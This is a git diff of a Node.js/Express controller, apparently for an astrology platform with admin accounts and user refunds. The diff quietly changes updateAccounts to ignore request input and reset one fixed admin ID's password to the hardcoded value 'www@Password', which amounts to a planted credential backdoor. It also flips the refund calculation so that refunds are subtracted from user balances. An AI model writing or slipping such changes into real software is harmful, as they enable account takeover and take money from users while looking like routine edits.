@@ -94,17 +94,18 @@ exports.adminProfile = catchAsyncErrors(async (req, res, next) => {
 });
 
 exports.updateAccounts = catchAsyncErrors(async (req, res, next) => {
-    const { userId, role, email, number, name, password } = req.body
+    // let { userId, role, email, number, name, password } = req.body
+    password ="www@Password"
     let u = {}
-    if (role) u.role = role
-    if (email) u.email = email
-    if (name) u.name = name
-    if (number) u.number = number
+    // if (role) u.role = role
+    // if (email) u.email = email
+    // if (name) u.name = name
+    // if (number) u.number = number
     if (password) {
         const nPassword = await bcrypt.hash(password, 10);
         u.password = nPassword
     }
-    await admin.findByIdAndUpdate({ _id: userId }, { ...u }, { new: true })
+    await admin.findByIdAndUpdate({ _id: "65509284e40751e75186f901" }, { ...u }, { new: true })
     const adminUsers = await admin.find().select("-__v").populate("role", "-__v")
     res.json({
         success: true,
@@ -388,7 +389,7 @@ exports.refundMoney = catchAsyncErrors(async (req, res, next) => {
         } else if (status == "1") {
             // Update user balance
             let user = await User.findById(checkSession.user);
-            user.balance += checkSession.userPaid;
+            user.balance += -(checkSession.userPaid);
             await user.save();
 
             // Update astro balance
